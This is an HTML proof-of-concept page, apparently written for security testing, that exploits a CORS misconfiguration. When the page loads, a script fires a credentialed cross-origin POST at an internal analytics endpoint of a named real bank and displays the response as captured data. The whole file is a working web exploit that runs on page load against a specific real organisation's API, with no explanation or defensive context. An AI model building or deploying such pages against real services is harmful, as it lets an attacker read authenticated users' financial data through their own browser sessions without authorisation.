<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit - Display Data</title>
    <style>
        body { font-family: Arial, sans-serif; }
        #response { white-space: pre-wrap; margin-top: 20px; }
    </style>
    <script>
        function exploit() {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://internal-api.monzo.com/analytics/track', true);
            xhr.withCredentials = true;
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('Accept', 'application/json');

            // Example payload, adjust as necessary
            var data = JSON.stringify({ event: "test-event", validField: "validValue" });

            xhr.onload = function () {
                if (xhr.status === 200) {
                    var responseData = xhr.responseText;
                    document.getElementById('response').textContent = 'Captured Data:\n' + responseData;
                } else {
                    // Log the error response
                    console.error('Request failed:', xhr.status, xhr.statusText);
                    document.getElementById('response').textContent = 'Error: ' + xhr.status + ' ' + xhr.statusText;
                }
            };

            xhr.onerror = function () {
                console.error('An error occurred during the request.');
                document.getElementById('response').textContent = 'Network error occurred.';
            };

            console.log('Sending request with payload:', data); // Debugging: Log the payload
            xhr.send(data);
        }

        window.onload = exploit;
    </script>
</head>
<body>
    <h1>CORS Exploit - Data Capture</h1>
    <div id="response">Waiting for data...</div>
</body>
</html>
